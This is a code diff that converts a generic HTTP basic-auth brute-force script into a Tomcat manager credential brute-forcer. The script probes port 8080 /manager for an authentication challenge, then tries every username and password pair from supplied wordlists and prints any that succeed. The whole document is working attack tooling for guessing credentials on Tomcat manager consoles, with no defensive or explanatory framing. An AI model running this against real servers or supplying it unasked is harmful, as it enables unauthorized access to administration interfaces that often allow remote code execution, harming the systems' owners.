@@ -38,13 +38,18 @@ def execute_scan(host, userfile, passwordfile, port, ssl):
     except Exception as FileError:
         print(FileError)
 
+    # To bruteforce tomcat, the url needs changing
+    url = 'http://' + host + ':' + str(port) + '/manager'
+    print(url)
+
     # start actual brute forcing
     for user in users:
+        print(user)
         for password in passwords:
-            http_login(host, port, connect_timeout, read_timeout, user, password, ssl)
+            brute_tomcat(url, port, connect_timeout, read_timeout, user, password, ssl)
 
 
-def http_login(host, port, connect_timeout, read_timeout, users, passw, SSL):
+def brute_tomcat(host, port, connect_timeout, read_timeout, users, passw, SSL):
     '''This function executes the http basic authentication bruteforce.
     :param str host: hosts (IP addresses, hostnames) comma separated
     :param int port: port number
@@ -61,24 +66,57 @@ def http_login(host, port, connect_timeout, read_timeout, users, passw, SSL):
         # connect to to ftp server and connect_timeout
         # check if connection should be SSL
         basicAuthCredentials = (users, passw)
+        print(basicAuthCredentials)
         # Send HTTP GET request to server and attempt to receive a response
         response = requests.get(host, timeout=http_timeout, auth=basicAuthCredentials)
 
         # If the HTTP GET request can be served
         if response.status_code == 200:
-            print(f'Login succeeded with: {users}:{passw}')
+            print('Login succeeded with: ' + users + " " + passw)
 
     except Exception as error:
         print(error)
 
 
-if __name__ == "__main__":
-    if len(sys.argv) != 4:
-        print("Not enough arguments:\n" +
-              'Usage: http_brute.py target userfile passfile')
+def check_for_tomcatauth(host):
+    """Checks if the site uses tomcat manager authentication."""
+
+    connect_timeout = 2
+    read_timeout = 2
+    http_timeout = (connect_timeout, read_timeout)
+    # To bruteforce tomcat, the url needs changing
+    url = 'http://' + host + ':8080' + '/manager'
+    print(url)
+    try:
+        response = requests.get(url,
+                                timeout=http_timeout)
+    except requests.exceptions.Timeout:
+        return False
+    except requests.exceptions.TooManyRedirects:
+        return False
+    except requests.exceptions.RequestException:
+        return False
+    print(response.headers)
+    if 'WWW-Authenticate' in response.headers:
+        return True
     else:
-        host = sys.argv[1]
-        users = sys.argv[2]
-        passw = sys.argv[3]
-        ssl = False
-        execute_scan(host, users, passw, 80, ssl)
+        return False
+
+
+if len(sys.argv) != 4:
+    print("Not enough arguments:\n" +
+          'Usage: tomcat_brute.py target userfile passfile')
+else:
+    host = sys.argv[1]
+    users = sys.argv[2]
+    passw = sys.argv[3]
+    ssl = False
+    print('userfile:' + users)
+    print('passwordfile: ' + passw)
+
+    # check if the site uses authentication
+    if check_for_tomcatauth(host):
+        print('tomcat authetication')
+        execute_scan(host, users, passw, 8080, ssl)
+    else:
+        print('No tomcat authentication')
